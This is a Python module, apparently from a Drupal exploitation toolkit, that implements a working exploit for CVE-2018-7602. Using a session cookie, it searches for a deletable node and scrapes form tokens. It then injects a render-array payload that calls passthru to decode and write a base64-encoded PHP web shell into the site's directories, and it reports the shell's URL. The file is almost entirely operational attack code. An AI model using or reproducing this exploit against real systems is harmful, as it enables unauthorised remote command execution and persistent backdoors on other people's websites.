import random
import re
import string

from exploits.ACVE import ACVE

__author__ = "Jean Lejeune <jlejeune@immunit.ch>"
__copyright__ = "Copyright 2018, ImmunIT"
__credit__ = "https://www.exploit-db.com/exploits/44542/"


class Exploit(ACVE):
    """This class tries exploit the CVE-2018-7602.
    """

    def __init__(self, request, target, logger):
        self.request = request
        self.target = target
        self.logger = logger
        self.cmd = "echo PD9waHAgaWYoIGlzc2V0KCAkX1JFUVVFU1RbJ2MnXSApICkgeyBzeXN0ZW0oICRfUkVRVUVTVFsnYyddIC4gJyAyPiYxJyApOyB9 | base64 -d | tee "
        self.paths = ["./", "./sites/default/", "./sites/default/files/"]

    def run(self, version):
        if self.request.cookies == "":
            self.logger.handle("\n[-] User must be authenticated. Did you provide a session cookie ?", self.logger.ERROR)
            return

        node, content = self._checkVulnerableNode()

        if node is None:
            self.logger.handle("\n[-] No vulnerable node found", self.logger.ERROR)
        else:
            self.logger.handle("\n[*] Sending payload...", None)

            for path in self.paths:
                endpoint = path + self._generateRandomString() + ".php"
                status_code = self._sendPayload(endpoint, node, content)

                if status_code == 200 and self.request.get("/" + endpoint).status_code == 200:
                    self.logger.handle(("\n[+] Exploit completed. Webshell accessible at: " + self.target + "/" + endpoint + "?c=CMD").replace("./", ""), self.logger.SUCCESS)
                    return

        self.logger.handle("\n[-] Exploit failed", self.logger.ERROR)

    def _checkVulnerableNode(self):
        """Check vulnerable node.

        Return
        ------
        Tuple vulnerable node and request content.
        """

        self.logger.handle("\n[*] Looking for a deletable node", None)

        node = ""
        req = ""
        for i in range(0, 3000):
            node = "/?q=node/" + str(i) + "/delete"
            req = self.request.get(node)
            if req.status_code == 200:
                self.logger.handle("\n[+] Vulnerable node found!", self.logger.SUCCESS)

                return node, str(req.content.decode("utf-8"))

        return None, None

    def _generateRandomString(self, size=6, chars=string.ascii_uppercase + string.digits):
        """Generates random string.

        Return
        ------
        Random string.
        """

        return ''.join(random.choice(chars) for _ in range(size))


    def _sendPayload(self, endpoint, node, content):
        """Send payload.

        Parameters
        ----------
        endpoint : str
            Dropping location
        content : str
            Node detection content

        Return
        ------
        Final status_code.
        """

        lines = content.split("\n")
        for line in lines:
            if "form_token\" value=" in line:
                match = re.search('value="(.*)"', line)
                value = match.group(1)
                break

        req = self.request.post(
                "form_id=node_delete_confirm&_triggering_element_name=form_id&form_token=" + value,
                node + "&destination=node?q[%2523post_render][]=passthru%26q[%2523type]=markup%26q[%2523markup]=" + self.cmd + endpoint
            )

        lines = str(req.content.decode("utf-8")).split("\n")
        for line in lines:
            if "form_build_id\" value=" in line:
                match = re.search('value="(.*)"', line)
                value = match.group(1)
                break

        req = self.request.post("form_build_id=" + value, "/?q=file/ajax/actions/cancel/%23options/path/" + value)

        return req.status_code
